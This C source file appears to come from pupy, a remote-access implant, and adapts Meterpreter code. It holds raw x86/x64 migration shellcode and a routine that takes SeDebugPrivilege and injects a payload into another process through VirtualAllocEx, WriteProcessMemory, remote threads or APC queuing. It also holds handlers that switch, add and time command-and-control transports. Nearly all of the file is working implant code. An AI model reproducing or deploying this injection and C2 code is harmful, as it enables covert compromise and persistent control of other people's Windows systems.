/* 
 This code has been taken from meterpreter and modified to be integrated into pupy.
 original code :https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/common/arch/win/i386/

Meterpreter is available for use under the following license, commonly known as the
3-clause (or "modified") BSD license:

=========================================================================================

Meterpreter
-----------

Copyright (c) 2006-2013, Rapid7 Inc

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of
  conditions and the following disclaimer.

* Redistributions in binary form must reproduce the above copyright notice, this list of
  conditions and the following disclaimer in the documentation and/or other materials
  provided with the distribution.

* Neither the name of Rapid7 nor the names of its contributors may be used to endorse or
  promote products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY
EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT
OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/
#include "common.h"
#include "base_inject.h"
#include "../../../config.h"

// see 'external/source/shellcode/windows/x86/src/migrate/migrate.asm'
BYTE migrate_stub_x86[] =	"\xFC\x8B\x74\x24\x04\x81\xEC\x00\x20\x00\x00\xE8\x89\x00\x00\x00"
							"\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B\x52\x0C\x8B\x52\x14\x8B"
							"\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61\x7C\x02\x2C"
							"\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57\x8B\x52\x10\x8B\x42\x3C"
							"\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01\xD0\x50\x8B\x48\x18\x8B"
							"\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B\x01\xD6\x31\xFF\x31\xC0"
							"\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03\x7D\xF8\x3B\x7D\x24"
							"\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01"
							"\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51"
							"\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D\x68\x33\x32\x00\x00\x68"
							"\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00"
							"\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x50\x50\x8D\x5E"
							"\x10\x53\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\xFF"
							"\x36\x68\x1D\x9F\x26\x35\xFF\xD5\xFF\x56\x08";

// see 'external/source/shellcode/windows/x64/src/migrate/migrate.asm'
BYTE migrate_stub_x64[] =	"\xFC\x48\x89\xCE\x48\x81\xEC\x00\x20\x00\x00\x48\x83\xE4\xF0\xE8"
							"\xC8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48"
							"\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48"
							"\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C"
							"\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52"
							"\x20\x8B\x42\x3C\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B"
							"\x80\x88\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48"
							"\x18\x44\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34"
							"\x88\x48\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41"
							"\x01\xC1\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8"
							"\x58\x44\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40"
							"\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E"
							"\x59\x5A\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0"
							"\x58\x41\x59\x5A\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x49\xBE\x77"
							"\x73\x32\x5F\x33\x32\x00\x00\x41\x56\x48\x89\xE1\x48\x81\xEC\xA0"
							"\x01\x00\x00\x49\x89\xE5\x48\x83\xEC\x28\x41\xBA\x4C\x77\x26\x07"
							"\xFF\xD5\x4C\x89\xEA\x6A\x02\x59\x41\xBA\x29\x80\x6B\x00\xFF\xD5"
							"\x4D\x31\xC0\x41\x50\x41\x50\x4C\x8D\x4E\x10\x6A\x01\x5A\x6A\x02"
							"\x59\x41\xBA\xEA\x0F\xDF\xE0\xFF\xD5\x48\x89\xC7\x48\x8B\x0E\x41"
							"\xBA\x1D\x9F\x26\x35\xFF\xD5\xFF\x56\x08";

// We force 64bit algnment for HANDLES and POINTERS in order 
// to be cross compatable between x86 and x64 migration.
typedef struct _MIGRATECONTEXT
{
 	union
	{
		HANDLE hEvent;
		BYTE bPadding1[8];
	} e;

	union
	{
 		LPBYTE lpPayload;
		BYTE bPadding2[8];
	} p;

 	WSAPROTOCOL_INFO info;

} MIGRATECONTEXT, * LPMIGRATECONTEXT;

DWORD create_transport_from_request(Remote* remote, Packet* packet, Transport** transportBufer)
{
	DWORD result = ERROR_NOT_ENOUGH_MEMORY;
	Transport* transport = NULL;
	wchar_t* transportUrl = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);

	TimeoutSettings timeouts = { 0 };

	int sessionExpiry = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
	timeouts.comms = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
	timeouts.retry_total = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
	timeouts.retry_wait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);

	// special case, will still leave this in here even if it's not transport related
	if (sessionExpiry != 0)
	{
		remote->sess_expiry_time = sessionExpiry;
		remote->sess_expiry_end = current_unix_timestamp() + remote->sess_expiry_time;
	}

	if (timeouts.comms == 0)
	{
		timeouts.comms = remote->transport->timeouts.comms;
	}
	if (timeouts.retry_total == 0)
	{
		timeouts.retry_total = remote->transport->timeouts.retry_total;
	}
	if (timeouts.retry_wait == 0)
	{
		timeouts.retry_wait = remote->transport->timeouts.retry_wait;
	}

	dprintf("[CHANGE TRANS] Url: %S", transportUrl);
	dprintf("[CHANGE TRANS] Comms: %d", timeouts.comms);
	dprintf("[CHANGE TRANS] Retry Total: %u", timeouts.retry_total);
	dprintf("[CHANGE TRANS] Retry Wait: %u", timeouts.retry_wait);

	do
	{
		if (transportUrl == NULL)
		{
			dprintf("[CHANGE TRANS] Something was NULL");
			break;
		}

		if (wcsncmp(transportUrl, L"tcp", 3) == 0)
		{
			MetsrvTransportTcp config = { 0 };
			config.common.comms_timeout = timeouts.comms;
			config.common.retry_total = timeouts.retry_total;
			config.common.retry_wait = timeouts.retry_wait;
			memcpy(config.common.url, transportUrl, sizeof(config.common.url));
			transport = remote->trans_create(remote, &config.common, NULL);
		}
		else
		{
			BOOL ssl = wcsncmp(transportUrl, L"https", 5) == 0;
			wchar_t* ua = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_UA);
			wchar_t* proxy = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_HOST);
			wchar_t* proxyUser = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_USER);
			wchar_t* proxyPass = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_PASS);
			PBYTE certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH);

			MetsrvTransportHttp config = { 0 };
			config.common.comms_timeout = timeouts.comms;
			config.common.retry_total = timeouts.retry_total;
			config.common.retry_wait = timeouts.retry_wait;
			wcsncpy(config.common.url, transportUrl, URL_SIZE);

			if (proxy)
			{
				wcsncpy(config.proxy.hostname, proxy, PROXY_HOST_SIZE);
				free(proxy);
			}

			if (proxyUser)
			{
				wcsncpy(config.proxy.username, proxyUser, PROXY_USER_SIZE);
				free(proxyUser);
			}

			if (proxyPass)
			{
				wcsncpy(config.proxy.password, proxyPass, PROXY_PASS_SIZE);
				free(proxyPass);
			}

			if (ua)
			{
				wcsncpy(config.ua, ua, UA_SIZE);
				free(ua);
			}

			if (certHash)
			{
				memcpy(config.ssl_cert_hash, certHash, CERT_HASH_SIZE);
				// No need to free this up as it's not a wchar_t
			}

			transport = remote->trans_create(remote, &config.common, NULL);
		}

		// tell the server dispatch to exit, it should pick up the new transport
		result = ERROR_SUCCESS;
	} while (0);

	*transportBufer = transport;

	return result;
}

DWORD remote_request_core_transport_list(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response = NULL;

	do
	{
		response = packet_create_response(packet);

		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Add the session timeout to the top level
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->sess_expiry_end - current_unix_timestamp());

		Transport* current = remote->transport;
		Transport* first = remote->transport;

		do
		{
			Packet* transportGroup = packet_create_group();

			if (!transportGroup)
			{
				// bomb out, returning what we have so far.
				break;
			}

			dprintf("[DISPATCH] Adding URL %S", current->url);
			packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_URL, current->url);
			dprintf("[DISPATCH] Adding Comms timeout %u", current->timeouts.comms);
			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_COMM_TIMEOUT, current->timeouts.comms);
			dprintf("[DISPATCH] Adding Retry total %u", current->timeouts.retry_total);
			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_RETRY_TOTAL, current->timeouts.retry_total);
			dprintf("[DISPATCH] Adding Retry wait %u", current->timeouts.retry_wait);
			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_RETRY_WAIT, current->timeouts.retry_wait);

			if (current->type != METERPRETER_TRANSPORT_SSL)
			{
				HttpTransportContext* ctx = (HttpTransportContext*)current->ctx;
				dprintf("[DISPATCH] Transport is HTTP/S");
				if (ctx->ua)
				{
					packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_UA, ctx->ua);
				}
				if (ctx->proxy)
				{
					packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_HOST, ctx->proxy);
				}
				if (ctx->proxy_user)
				{
					packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_USER, ctx->proxy_user);
				}
				if (ctx->proxy_pass)
				{
					packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_PASS, ctx->proxy_pass);
				}
				if (ctx->cert_hash)
				{
					packet_add_tlv_raw(transportGroup, TLV_TYPE_TRANS_CERT_HASH, ctx->cert_hash, CERT_HASH_SIZE);
				}
			}

			packet_add_group(response, TLV_TYPE_TRANS_GROUP, transportGroup);

			current = current->next_transport;
		} while (first != current);
	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}

BOOL remote_request_core_transport_next(Remote* remote, Packet* packet, DWORD* result)
{
	dprintf("[DISPATCH] Asking to go to next transport (from 0x%p to 0x%p)", remote->transport, remote->transport->next_transport);
	if (remote->transport == remote->transport->next_transport)
	{
		dprintf("[DISPATCH] Transports are the same, don't do anything");
		// if we're switching to the same thing, don't bother.
		*result = ERROR_INVALID_FUNCTION;
	}
	else
	{
		dprintf("[DISPATCH] Transports are different, perform the switch");
		remote->next_transport = remote->transport->next_transport;
		*result = ERROR_SUCCESS;
	}

	packet_transmit_empty_response(remote, packet, *result);
	return *result == ERROR_SUCCESS ? FALSE : TRUE;

}

BOOL remote_request_core_transport_prev(Remote* remote, Packet* packet, DWORD* result)
{
	dprintf("[DISPATCH] Asking to go to previous transport (from 0x%p to 0x%p)", remote->transport, remote->transport->prev_transport);
	if (remote->transport == remote->transport->prev_transport)
	{
		dprintf("[DISPATCH] Transports are the same, don't do anything");
		// if we're switching to the same thing, don't bother.
		*result = ERROR_INVALID_FUNCTION;
	}
	else
	{
		dprintf("[DISPATCH] Transports are different, perform the switch");
		remote->next_transport = remote->transport->prev_transport;
		*result = ERROR_SUCCESS;
	}

	packet_transmit_empty_response(remote, packet, *result);
	return *result == ERROR_SUCCESS ? FALSE : TRUE;
}

DWORD remote_request_core_transport_remove(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;

	// make sure we are not trying to remove the last transport
	if (remote->transport == remote->transport->prev_transport)
	{
		dprintf("[DISPATCH] Refusing to delete the last transport");
		result = ERROR_INVALID_FUNCTION;
	}
	else
	{
		Transport* found = NULL;
		Transport* transport = remote->transport;
		wchar_t* transportUrl = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);

		do
		{
			if (wcscmp(transportUrl, transport->url) == 0)
			{
				found = transport;
				break;
			}

			transport = transport->next_transport;
		} while (transport != remote->transport);

		if (found == NULL || found == remote->transport)
		{
			dprintf("[DISPATCH] Transport not found, or attempting to remove current");
			// if we don't have a valid transport, or they're trying to remove the
			// existing one, then bomb out (that might come later)
			result = ERROR_INVALID_PARAMETER;
		}
		else
		{
			remote->trans_remove(remote, found);
			dprintf("[DISPATCH] Transport removed");
		}

		SAFE_FREE(transportUrl);
	}

	packet_transmit_empty_response(remote, packet, result);
	dprintf("[DISPATCH] Response sent.");
	return result;
}

DWORD remote_request_core_transport_add(Remote* remote, Packet* packet)
{
	Transport* transport = NULL;
	DWORD result = create_transport_from_request(remote, packet, &transport);

	packet_transmit_empty_response(remote, packet, result);
	return result;
}

BOOL remote_request_core_transport_sleep(Remote* remote, Packet* packet, DWORD* result)
{
	// we'll reuse the comm timeout TLV for this purpose
	DWORD seconds = packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);

	dprintf("[DISPATCH] request received to sleep for %u seconds", seconds);

	// to sleep, we simply jump to the same transport, with a delay
	remote->next_transport_wait = seconds;
	remote->next_transport = remote->transport;

	packet_transmit_empty_response(remote, packet, ERROR_SUCCESS);
	*result = ERROR_SUCCESS;

	// exit out of the dispatch loop
	return FALSE;
}

BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD* result)
{
	Transport* transport = NULL;
	*result = create_transport_from_request(remote, packet, &transport);

	packet_transmit_empty_response(remote, packet, *result);

	if (*result == ERROR_SUCCESS)
	{
		remote->next_transport = transport;
		// exit out of the dispatch loop.
		return FALSE;
	}

	return TRUE;
}

/*!
 * @brief Set the current hash that is used for SSL certificate verification.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 */
DWORD remote_request_core_transport_setcerthash(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// no setting of the cert hash if the target isn't a HTTPS transport
		if (remote->transport->type != METERPRETER_TRANSPORT_HTTPS)
		{
			result = ERROR_BAD_ENVIRONMENT;
			break;
		}

		unsigned char* certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH);
		HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

		// Support adding a new cert hash if one doesn't exist
		if (!ctx->cert_hash)
		{
			if (certHash)
			{
				PBYTE newHash = (unsigned char*)malloc(sizeof(unsigned char)* CERT_HASH_SIZE);
				if (!newHash)
				{
					result = ERROR_NOT_ENOUGH_MEMORY;
					break;
				}

				memcpy(newHash, certHash, CERT_HASH_SIZE);

				// Set it at the last minute. Mucking with "globals" and all, want to make sure we
				// don't set it too early.. just in case.
				ctx->cert_hash = newHash;
			}
			else
			{
				// at this time, don't support overwriting of the existing hash
				// as that will cause issues!
				result = ERROR_BAD_ARGUMENTS;
				break;
			}
		}
		// support removal of the existing hash
		else
		{
			if (certHash)
			{
				result = ERROR_BAD_ARGUMENTS;
				break;
			}
			else
			{
				SAFE_FREE(ctx->cert_hash);
			}
		}

		result = ERROR_SUCCESS;
	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}

/*!
 * @brief Get the current hash that is used for SSL certificate verification.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 */
DWORD remote_request_core_transport_getcerthash(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Rather than error out if the transport isn't HTTPS, we'll just return
		// an empty response. This prevents a horrible error appearing in the
		// MSF console
		if (remote->transport->type == METERPRETER_TRANSPORT_HTTPS)
		{
			HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
			if (ctx->cert_hash)
			{
				packet_add_tlv_raw(response, TLV_TYPE_TRANS_CERT_HASH, ctx->cert_hash, CERT_HASH_SIZE);
			}
		}

		result = ERROR_SUCCESS;
	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}

/*!
 * @brief Migrate the meterpreter server from the current process into another process.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @param pResult Pointer to the memory that will receive the result.
 * @returns Indication of whether the server should continue processing or not.
 */
BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResult)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet * response = NULL;
	HANDLE hToken = NULL;
	HANDLE hProcess = NULL;
	HANDLE hEvent = NULL;
	BYTE * lpPayloadBuffer = NULL;
	LPVOID lpMigrateStub = NULL;
	LPBYTE lpMemory = NULL;
	MIGRATECONTEXT ctx = { 0 };
	DWORD dwMigrateStubLength = 0;
	DWORD dwPayloadLength = 0;
	DWORD dwProcessID = 0;
	DWORD dwDestinationArch = 0;

	MetsrvConfig* config = NULL;
	DWORD configSize = 0;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			dwResult = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Get the process identifier to inject into
		dwProcessID = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_PID);

		// Get the target process architecture to inject into
		dwDestinationArch = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_ARCH);

		// Get the length of the payload buffer
		dwPayloadLength = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_LEN);

		// Receive the actual migration payload buffer
		lpPayloadBuffer = packet_get_tlv_value_string(packet, TLV_TYPE_MIGRATE_PAYLOAD);

		dprintf("[MIGRATE] Attempting to migrate. ProcessID=%d, Arch=%s, PayloadLength=%d", dwProcessID, (dwDestinationArch == 2 ? "x64" : "x86"), dwPayloadLength);

		// If we can, get SeDebugPrivilege...
		if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		{
			TOKEN_PRIVILEGES priv = { 0 };

			priv.PrivilegeCount = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			{
				if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL));
				{
					dprintf("[MIGRATE] Got SeDebugPrivilege!");
				}
			}

			CloseHandle(hToken);
		}

		// Open the process so that we can migrate into it
		hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessID);
		if (!hProcess)
		{
			BREAK_ON_ERROR("[MIGRATE] OpenProcess failed")
		}

		// get the existing configuration
		dprintf("[MIGRATE] creating the configuration block");
		remote->config_create(remote, &config, &configSize);
		dprintf("[MIGRATE] Config of %u bytes stashed at 0x%p", configSize, config);

		if (config->session.comms_fd)
		{
			// Duplicate the socket for the target process if we are SSL based
			if (WSADuplicateSocket(config->session.comms_fd, dwProcessID, &ctx.info) != NO_ERROR)
			{
				BREAK_ON_WSAERROR("[MIGRATE] WSADuplicateSocket failed")
			}
		}

		// Create a notification event that we'll use to know when it's safe to exit 
		// (once the socket has been referenced in the other process)
		hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (!hEvent)
		{
			BREAK_ON_ERROR("[MIGRATE] CreateEvent failed")
		}

		// Duplicate the event handle for the target process
		if (!DuplicateHandle(GetCurrentProcess(), hEvent, hProcess, &ctx.e.hEvent, 0, TRUE, DUPLICATE_SAME_ACCESS))
		{
			BREAK_ON_ERROR("[MIGRATE] DuplicateHandle failed")
		}

		// Get the architecture specific process migration stub...
		if (dwDestinationArch == PROCESS_ARCH_X86)
		{
			lpMigrateStub = (LPVOID)&migrate_stub_x86;
			dwMigrateStubLength = sizeof(migrate_stub_x86);
		}
		else if (dwDestinationArch == PROCESS_ARCH_X64)
		{
			lpMigrateStub = (LPVOID)&migrate_stub_x64;
			dwMigrateStubLength = sizeof(migrate_stub_x64);
		}
		else
		{
			SetLastError(ERROR_BAD_ENVIRONMENT);
			dprintf("[MIGRATE] Invalid target architecture: %u", dwDestinationArch);
			break;
		}

		// Allocate memory for the migrate stub, context, payload and configuration block
		lpMemory = (LPBYTE)VirtualAllocEx(hProcess, NULL, dwMigrateStubLength + sizeof(MIGRATECONTEXT) + dwPayloadLength + configSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!lpMemory)
		{
			BREAK_ON_ERROR("[MIGRATE] VirtualAllocEx failed")
		}

		// Calculate the address of the payload...
		ctx.p.lpPayload = lpMemory + dwMigrateStubLength + sizeof(MIGRATECONTEXT);

		// Write the migrate stub to memory...
		dprintf("[MIGRATE] Migrate stub: 0x%p -> %u bytes", lpMemory, dwMigrateStubLength);
		if (!WriteProcessMemory(hProcess, lpMemory, lpMigrateStub, dwMigrateStubLength, NULL))
		{
			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 1 failed")
		}

		// Write the migrate context to memory...
		dprintf("[MIGRATE] Migrate context: 0x%p -> %u bytes", lpMemory + dwMigrateStubLength, sizeof(MIGRATECONTEXT));
		if (!WriteProcessMemory(hProcess, lpMemory + dwMigrateStubLength, &ctx, sizeof(MIGRATECONTEXT), NULL))
		{
			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 2 failed")
		}

		// Write the migrate payload to memory...
		dprintf("[MIGRATE] Migrate payload: 0x%p -> %u bytes", ctx.p.lpPayload, dwPayloadLength);
		if (!WriteProcessMemory(hProcess, ctx.p.lpPayload, lpPayloadBuffer, dwPayloadLength, NULL))
		{
			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 3 failed")
		}

		// finally write the configuration stub
		dprintf("[MIGRATE] Configuration: 0x%p -> %u bytes", ctx.p.lpPayload + dwPayloadLength, configSize);
		if (!WriteProcessMemory(hProcess, ctx.p.lpPayload + dwPayloadLength, config, configSize, NULL))
		{
			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 4 failed")
		}

		// First we try to migrate by directly creating a remote thread in the target process
		if (inject_via_remotethread(remote, response, hProcess, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
		{
			dprintf("[MIGRATE] inject_via_remotethread failed, trying inject_via_apcthread...");

			// If that fails we can try to migrate via a queued APC in the target process
			if (inject_via_apcthread(remote, response, hProcess, dwProcessID, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
			{
				BREAK_ON_ERROR("[MIGRATE] inject_via_apcthread failed")
			}
		}

		dwResult = ERROR_SUCCESS;

	} while (0);

	SAFE_FREE(config);

	// If we failed and have not sent the response, do so now
	if (dwResult != ERROR_SUCCESS && response)
	{
		dprintf("[MIGRATE] Sending response");
		packet_transmit_response(dwResult, remote, response);
	}

	// Cleanup...
	if (hProcess)
	{
		dprintf("[MIGRATE] Closing the process handle 0x%08x", hProcess);
		CloseHandle(hProcess);
	}

	if (hEvent)
	{
		dprintf("[MIGRATE] Closing the event handle 0x%08x", hEvent);
		CloseHandle(hEvent);
	}

	if (pResult)
	{
		*pResult = dwResult;
	}

	// if migration succeeded, return 'FALSE' to indicate server thread termination.
	dprintf("[MIGRATE] Finishing migration, result: %u", dwResult);
	return ERROR_SUCCESS == dwResult ? FALSE : TRUE;
}

/*!
 * @brief Update the timeouts with the given values
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 * @remark If no values are given, no updates are made. The response to
 *         this message is the new/current settings.
 */
DWORD remote_request_core_transport_set_timeouts(Remote * remote, Packet * packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response = NULL;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		int expirationTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
		int commsTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
		DWORD retryTotal = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
		DWORD retryWait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);

		// TODO: put this in a helper function that can be used everywhere?

		// if it's in the past, that's fine, but 0 implies not set
		if (expirationTimeout != 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting expiration time to %d", expirationTimeout);
			remote->sess_expiry_time = expirationTimeout;
			remote->sess_expiry_end = current_unix_timestamp() + expirationTimeout;
		}

		if (commsTimeout != 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting comms timeout to %d", commsTimeout);
			remote->transport->timeouts.comms = commsTimeout;
			remote->transport->comms_last_packet = current_unix_timestamp();
		}

		if (retryTotal > 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting retry total to %u", retryTotal);
			remote->transport->timeouts.retry_total = retryTotal;
		}

		if (retryWait > 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting retry wait to %u", retryWait);
			remote->transport->timeouts.retry_wait = retryWait;
		}

		// for the session expiry, return how many seconds are left before the session actually expires
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->sess_expiry_end - current_unix_timestamp());
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_COMM_TIMEOUT, remote->transport->timeouts.comms);
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_TOTAL, remote->transport->timeouts.retry_total);
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_WAIT, remote->transport->timeouts.retry_wait);

	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}

